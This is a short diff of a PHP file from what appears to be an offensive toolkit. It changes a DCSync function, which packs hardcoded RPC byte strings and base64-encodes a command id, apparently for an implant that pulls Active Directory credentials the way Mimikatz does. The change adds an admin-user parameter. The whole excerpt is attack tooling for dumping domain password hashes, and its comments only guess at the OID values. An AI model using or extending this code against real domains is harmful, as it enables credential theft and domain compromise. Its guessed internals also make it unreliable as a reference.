@@ -698,11 +698,11 @@ function port_scan($hostname, $ports)
 /////////////////////////////////////////////////////////////
 
 /*
-	$p1 : sizeof = 0x6DD
-	$p2 : sizeof = 0x355
- 	ex: DCSync("mylab.local");
+ 	ex: DCSync("admin", "mylab.local");
+  	parameters AA to NN are Object Identifiers in the form "1.2.840.113549.1.1.1"
+   	likely OID values are the ones used in Mimikatz
 */
-function DCSync($DomainName)
+function DCSync($admin_user, $DomainName)
 {
 	// TypeFormatString
 	$p1 = "\x00\x00\x1d\x00\x08\x00\x01\x5b\x15\x03\x10\x00\x08\x06\x06\x4c\x00\xf1\xff\x5b\x15\x07\x18\x00\x0b\x0b\x0b\x5b\xb7\x08\x00\x00";
@@ -793,7 +793,7 @@ $p2 = $p2 . "\x8c\x06\x50\x21\x18\x00\x08\x00\x13\xa1\x20\x00\xc6\x06\x70\x00\x2
 	$p1_b64 = base64_encode($p1);
 	$p2_b64 = base64_encode($p2);
 	
-	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN toto $DomainName";
+	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN $admin_user $DomainName";
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
 	return $cmd_id_b64;
